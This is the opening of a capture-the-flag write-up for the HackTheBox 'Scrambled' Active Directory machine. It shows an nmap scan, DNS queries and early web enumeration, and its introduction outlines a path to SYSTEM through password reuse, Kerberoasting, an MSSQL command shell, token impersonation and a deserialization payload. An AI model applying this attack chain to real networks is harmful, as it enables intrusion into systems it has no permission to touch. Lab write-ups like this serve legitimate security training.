---
title: "Scrambled HackTheBox" 
date: 2025-08-14 23:50:00 0000+
tags: [WriteUp, Scrambled, HTB, Enumeration, Active Directory, DNSpy, GodPotato, .NET, Reverse Engineering, Serialization, De-Serialization, Ysoserial, Msfvenom, Wireshark, password reuse, SilverTicket, RealmFix, Hash Cracking, Kerberoasting, Rusthound, Bloodhound, Rusthound-CE, MSSQL, SQL-Admin, impacket-Ticketer, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Scrambled_HTB/preview_scrambled.png
---
# Scrambled HTB Writeup

Scrambled is an medium level Active Directory box on HackTheBox which focuses on Active directory and reverse engineering, after enumerating the domain we found a user has a same password as their name after logging in with that there a mssql server running and a user is kerberoastable, upon cracking this users hash we retrieve their password and get on the server. Discovered an unintended way to pwn this box, in the mssql shell we can enable the cmd shell which gives us a shell on the box which has impersonation privileges enabled giving us the root shell. The Intended way of solving this is we discover a password of a user account on the MSSQL server which lets them have their shell and then bloodhound tells us that this user is a part of a share which now we have read permission this share gives us a .NET Assembly file, reverse engineering this file revels that we have to upload a payload through this application and after doing that the binary was running on the DC with the SYSTEM privileges giving us the SYSTEM shell on the box.

![image.png](/assets/images/Scrambled_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services on the box.

```bash
rustmap.py -ip 10.129.240.33
```

We have the following results.

```text
# Nmap 7.94SVN scan initiated Wed Aug 13 17:59:37 2025 as: nmap -sC -sV -v -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49716,49720,55069 -oA nmap/scram 10.129.240.33
Nmap scan report for 10.129.240.33
Host is up (0.28s latency).
Scanned at 2025-08-13 17:59:38 IST for 205s

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-13 12:30:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
| MIIFtzCCBJ+gAwIBAgITEgAAAAWd33nJkSGX4QAAAAAABTANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAgFw0yNDA5MDQxMTE0NDVaGA8yMTIxMDYw
| ODIyMzk1M1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL7APeOI
| QpFcy0JhCXiFe+YukkzyogwrXQG4jwuUqVtnzI0qKsJ2HKdvOLp5W+Fc4RwFdNMU
| q3cVCiwRMDdgsZbDull+e8s8kNmdBNNqcaHFwKXYbdWiXR2aBysPf9Gzs3iWllhs
| Ja1ihbrArixe2471/rjohLiz8VVssVQqUm8KjcO/jRFOLd2y1MtQPoOhTQtDasFT
| SceuhHLAe7RHygnndnyo2Sb+O0Neaeq0YDdc9zU5yjGilpJUYKYB36z32IOfEdJ8
| OJr1iqg9oFZ0KKqskm5YT6PhFZFwpSAn4Re8xTfBOglopFn/mEBTh7ibLXL25K5/
| H4ve2hiQIPsD0rECAwEAAaOCAuMwggLfMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaj2B2B69kvgd2ZGYSm9EaL4D9SARwCAW4CAQIwKQYDVR0lBCIwIAYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICMA4GA1UdDwEB/wQEAwIFoDA1Bgkr
| BgEEAYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisGAQQBgjcU
| AgIwHQYDVR0OBBYEFBRGx6zDOGOtjPPvaoLO36fByJ5LMB8GA1UdIwQYMBaAFAhp
| QhkKLZ9wcDY0RhznHYYVm2iSMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
| Oi8vL0NOPXNjcm0tREMxLUNBLENOPURDMSxDTj1DRFAsQ049UHVibGljJTIwS2V5
| JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zY3Jt
| LERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvAYIKwYBBQUHAQEEga8wgawwgakG
| CCsGAQUFBzAChoGcbGRhcDovLy9DTj1zY3JtLURDMS1DQSxDTj1BSUEsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1zY3JtLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MBwGA1UdEQEB/wQSMBCCDkRDMS5zY3Jt
| LmxvY2FsME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0yNzQzMjA3MDQ1LTE4Mjc4MzExMDUtMjU0MjUyMzIwMC0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQCecGFCSZW5yaXkTpXR5b09rpGBFyLSOJeS0Hv1LBmeN040mUXr
| 9wydqlVd1jPt2HbiMA07ftoR3LnCZYEOppSK+yX4GePev04aFRbFAunUDPvzC1FI
| 0Tqrh9/DSW0Zuqsmp6k34B5MSiYYfgSqtF4qdYQ4FyuxqoBft89+C+T65e5Io6Yu
| BAdyMGJqohUMGPxk3hzRQV5MqikqS/Ffj27YnqbBXivAr0W1RkytDHdsdqus9iNr
| EdMfkFzdSxBppaS59c+x289sotNYT0gTywBX86QDyP+TEFZgPqX5pQVuazo1HOyC
| 41E5cc4R5EyAhM/olViiJa5w/LrKFa7oEgec
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-13T12:33:38+00:00; +39s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-13T12:33:38+00:00; +40s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
| MIIFtzCCBJ+gAwIBAgITEgAAAAWd33nJkSGX4QAAAAAABTANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAgFw0yNDA5MDQxMTE0NDVaGA8yMTIxMDYw
| ODIyMzk1M1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL7APeOI
| QpFcy0JhCXiFe+YukkzyogwrXQG4jwuUqVtnzI0qKsJ2HKdvOLp5W+Fc4RwFdNMU
| q3cVCiwRMDdgsZbDull+e8s8kNmdBNNqcaHFwKXYbdWiXR2aBysPf9Gzs3iWllhs
| Ja1ihbrArixe2471/rjohLiz8VVssVQqUm8KjcO/jRFOLd2y1MtQPoOhTQtDasFT
| SceuhHLAe7RHygnndnyo2Sb+O0Neaeq0YDdc9zU5yjGilpJUYKYB36z32IOfEdJ8
| OJr1iqg9oFZ0KKqskm5YT6PhFZFwpSAn4Re8xTfBOglopFn/mEBTh7ibLXL25K5/
| H4ve2hiQIPsD0rECAwEAAaOCAuMwggLfMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaj2B2B69kvgd2ZGYSm9EaL4D9SARwCAW4CAQIwKQYDVR0lBCIwIAYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICMA4GA1UdDwEB/wQEAwIFoDA1Bgkr
| BgEEAYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisGAQQBgjcU
| AgIwHQYDVR0OBBYEFBRGx6zDOGOtjPPvaoLO36fByJ5LMB8GA1UdIwQYMBaAFAhp
| QhkKLZ9wcDY0RhznHYYVm2iSMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
| Oi8vL0NOPXNjcm0tREMxLUNBLENOPURDMSxDTj1DRFAsQ049UHVibGljJTIwS2V5
| JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zY3Jt
| LERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvAYIKwYBBQUHAQEEga8wgawwgakG
| CCsGAQUFBzAChoGcbGRhcDovLy9DTj1zY3JtLURDMS1DQSxDTj1BSUEsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1zY3JtLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MBwGA1UdEQEB/wQSMBCCDkRDMS5zY3Jt
| LmxvY2FsME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0yNzQzMjA3MDQ1LTE4Mjc4MzExMDUtMjU0MjUyMzIwMC0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQCecGFCSZW5yaXkTpXR5b09rpGBFyLSOJeS0Hv1LBmeN040mUXr
| 9wydqlVd1jPt2HbiMA07ftoR3LnCZYEOppSK+yX4GePev04aFRbFAunUDPvzC1FI
| 0Tqrh9/DSW0Zuqsmp6k34B5MSiYYfgSqtF4qdYQ4FyuxqoBft89+C+T65e5Io6Yu
| BAdyMGJqohUMGPxk3hzRQV5MqikqS/Ffj27YnqbBXivAr0W1RkytDHdsdqus9iNr
| EdMfkFzdSxBppaS59c+x289sotNYT0gTywBX86QDyP+TEFZgPqX5pQVuazo1HOyC
| 41E5cc4R5EyAhM/olViiJa5w/LrKFa7oEgec
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-13T12:24:02
| Not valid after:  2055-08-13T12:24:02
| MD5:   919f:c73e:9cc0:5914:0608:99c8:ef9b:151d
| SHA-1: 184a:93d4:0974:e659:d230:6d03:2348:2d89:fa7d:3ac9
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQMPZrLmettatMV3KfPPxZtDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwODEzMTIyNDAyWhgPMjA1NTA4MTMxMjI0MDJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKRhCSsk
| J7gQNxi58zBamQ4ddyVQpdUoxD7RxclnUw06lZWXxnfJXGLHSIm96mynXCov+fzG
| BeWB7HvxqAoH4Bw2PVZ2G7wb0Y5ou5cL3vUucAImbUwb/4Twh8rom3Hqd1BA79jk
| cJNZkVCYR5Tt2woIbObD9AmqPqMaeJ+/AYTnbkeH4JJtafz3WQQT8HREusdj6/E5
| JAgid8uw3M9yzo6oiD6zIoPEwNEwCxzctDwh6KnR3kM5NNzmu1XdsWVGPiUwwODP
| ulsYMYTZiwnpDEpYCbJjzsMiuxonfqwXA16eRKXp8Sz2YnJ5+ML9TR/fDHdYJIMb
| lNLIfMqJu6tNENUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAHYAQiIqT5OzYl50V
| l6f81r8nzKZa5/FMpDeUxbhwo7MngZLwvVTrmgSPCkQcqVo6AUJHC9YWqFur7/S/
| a+0r9Lyeye5Ctq21N3D64+HmayPbI+75Fn2CExiGrZYVvF5whkAb8PW8UiSAGFj2
| YBO4FPpil/ksA6L11cq5AYFMBG+pySuQrhcUCnApNRrArd1mvAJ2d9g2QQfAxgCU
| K8XNWMKSxZdZqp0iVkXaELvLdIhYKDW8k8qswC+JeT5h/YHZJiuNcJygZfmA1Wv7
| jek+WBxuq8BOO/6Y33xB5fWZXJmtLEJj+MzSOMktKTDLTF6RNqG9ca9gFezycJVs
| RMz9vQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-13T12:33:38+00:00; +39s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-13T12:33:38+00:00; +39s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
| MIIFtzCCBJ+gAwIBAgITEgAAAAWd33nJkSGX4QAAAAAABTANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAgFw0yNDA5MDQxMTE0NDVaGA8yMTIxMDYw
| ODIyMzk1M1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL7APeOI
| QpFcy0JhCXiFe+YukkzyogwrXQG4jwuUqVtnzI0qKsJ2HKdvOLp5W+Fc4RwFdNMU
| q3cVCiwRMDdgsZbDull+e8s8kNmdBNNqcaHFwKXYbdWiXR2aBysPf9Gzs3iWllhs
| Ja1ihbrArixe2471/rjohLiz8VVssVQqUm8KjcO/jRFOLd2y1MtQPoOhTQtDasFT
| SceuhHLAe7RHygnndnyo2Sb+O0Neaeq0YDdc9zU5yjGilpJUYKYB36z32IOfEdJ8
| OJr1iqg9oFZ0KKqskm5YT6PhFZFwpSAn4Re8xTfBOglopFn/mEBTh7ibLXL25K5/
| H4ve2hiQIPsD0rECAwEAAaOCAuMwggLfMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaj2B2B69kvgd2ZGYSm9EaL4D9SARwCAW4CAQIwKQYDVR0lBCIwIAYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICMA4GA1UdDwEB/wQEAwIFoDA1Bgkr
| BgEEAYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisGAQQBgjcU
| AgIwHQYDVR0OBBYEFBRGx6zDOGOtjPPvaoLO36fByJ5LMB8GA1UdIwQYMBaAFAhp
| QhkKLZ9wcDY0RhznHYYVm2iSMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
| Oi8vL0NOPXNjcm0tREMxLUNBLENOPURDMSxDTj1DRFAsQ049UHVibGljJTIwS2V5
| JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zY3Jt
| LERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvAYIKwYBBQUHAQEEga8wgawwgakG
| CCsGAQUFBzAChoGcbGRhcDovLy9DTj1zY3JtLURDMS1DQSxDTj1BSUEsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1zY3JtLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MBwGA1UdEQEB/wQSMBCCDkRDMS5zY3Jt
| LmxvY2FsME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0yNzQzMjA3MDQ1LTE4Mjc4MzExMDUtMjU0MjUyMzIwMC0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQCecGFCSZW5yaXkTpXR5b09rpGBFyLSOJeS0Hv1LBmeN040mUXr
| 9wydqlVd1jPt2HbiMA07ftoR3LnCZYEOppSK+yX4GePev04aFRbFAunUDPvzC1FI
| 0Tqrh9/DSW0Zuqsmp6k34B5MSiYYfgSqtF4qdYQ4FyuxqoBft89+C+T65e5Io6Yu
| BAdyMGJqohUMGPxk3hzRQV5MqikqS/Ffj27YnqbBXivAr0W1RkytDHdsdqus9iNr
| EdMfkFzdSxBppaS59c+x289sotNYT0gTywBX86QDyP+TEFZgPqX5pQVuazo1HOyC
| 41E5cc4R5EyAhM/olViiJa5w/LrKFa7oEgec
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-13T12:33:38+00:00; +40s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
| MIIFtzCCBJ+gAwIBAgITEgAAAAWd33nJkSGX4QAAAAAABTANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAgFw0yNDA5MDQxMTE0NDVaGA8yMTIxMDYw
| ODIyMzk1M1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL7APeOI
| QpFcy0JhCXiFe+YukkzyogwrXQG4jwuUqVtnzI0qKsJ2HKdvOLp5W+Fc4RwFdNMU
| q3cVCiwRMDdgsZbDull+e8s8kNmdBNNqcaHFwKXYbdWiXR2aBysPf9Gzs3iWllhs
| Ja1ihbrArixe2471/rjohLiz8VVssVQqUm8KjcO/jRFOLd2y1MtQPoOhTQtDasFT
| SceuhHLAe7RHygnndnyo2Sb+O0Neaeq0YDdc9zU5yjGilpJUYKYB36z32IOfEdJ8
| OJr1iqg9oFZ0KKqskm5YT6PhFZFwpSAn4Re8xTfBOglopFn/mEBTh7ibLXL25K5/
| H4ve2hiQIPsD0rECAwEAAaOCAuMwggLfMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaj2B2B69kvgd2ZGYSm9EaL4D9SARwCAW4CAQIwKQYDVR0lBCIwIAYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICMA4GA1UdDwEB/wQEAwIFoDA1Bgkr
| BgEEAYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisGAQQBgjcU
| AgIwHQYDVR0OBBYEFBRGx6zDOGOtjPPvaoLO36fByJ5LMB8GA1UdIwQYMBaAFAhp
| QhkKLZ9wcDY0RhznHYYVm2iSMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
| Oi8vL0NOPXNjcm0tREMxLUNBLENOPURDMSxDTj1DRFAsQ049UHVibGljJTIwS2V5
| JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zY3Jt
| LERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvAYIKwYBBQUHAQEEga8wgawwgakG
| CCsGAQUFBzAChoGcbGRhcDovLy9DTj1zY3JtLURDMS1DQSxDTj1BSUEsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1zY3JtLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MBwGA1UdEQEB/wQSMBCCDkRDMS5zY3Jt
| LmxvY2FsME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0yNzQzMjA3MDQ1LTE4Mjc4MzExMDUtMjU0MjUyMzIwMC0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQCecGFCSZW5yaXkTpXR5b09rpGBFyLSOJeS0Hv1LBmeN040mUXr
| 9wydqlVd1jPt2HbiMA07ftoR3LnCZYEOppSK+yX4GePev04aFRbFAunUDPvzC1FI
| 0Tqrh9/DSW0Zuqsmp6k34B5MSiYYfgSqtF4qdYQ4FyuxqoBft89+C+T65e5Io6Yu
| BAdyMGJqohUMGPxk3hzRQV5MqikqS/Ffj27YnqbBXivAr0W1RkytDHdsdqus9iNr
| EdMfkFzdSxBppaS59c+x289sotNYT0gTywBX86QDyP+TEFZgPqX5pQVuazo1HOyC
| 41E5cc4R5EyAhM/olViiJa5w/LrKFa7oEgec
|_-----END CERTIFICATE-----
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
55069/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=8/13%Time=689C8539%P=x86_64-pc-linux-gnu%r
SF:(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_OR
SF:DERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
SF:KNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Fo
SF:urOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMM
SF:AND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,3
SF:5,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAND
SF:esk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D
SF:,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-13T12:32:59
|_  start_date: N/A
|_clock-skew: mean: 39s, deviation: 0s, median: 38s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59706/tcp): CLEAN (Timeout)
|   Check 2 (port 53186/tcp): CLEAN (Timeout)
|   Check 3 (port 46166/udp): CLEAN (Timeout)
|   Check 4 (port 60353/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin//share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 13 18:03:03 2025 -- 1 IP address (1 host up) scanned in 205.76 seconds

```

Looking at the results this is an Active Directory box, adding the domain name and the DC name to our /etc/hosts file.

### DNS Enumeration

Port 53 is open on the box looking at the MS records we have.

```bash
dig @dc1.scrm.local scrm.local MS
```

![image.png](/assets/images/Scrambled_HTB/image%201.png)

Nothing interesting here, looking at the TXT records.

```bash
dig @dc1.scrm.local scrm.local TXT
```

![image.png](/assets/images/Scrambled_HTB/image%202.png)

Nothing in the TXT records also.

### Web Enumeration

Port 80 is open on the box, so lets head over to the [http://scrm.local/](http://scrm.local/) and find what's there.

![image.png](/assets/images/Scrambled_HTB/image%203.png)

This is the webpage, nothing’s here on the main page, looking over to other links.

We have IT Services tab too which leads us to support.html

![image.png](/assets/images/Scrambled_HTB/image%204.png)

They have disabled the NTLM authentication on the domain, means we can use kerberos authentication with the domain.

Also there are a few links associated with the above webpage.

Going over to the **Contacting IT Support,** we have this page.

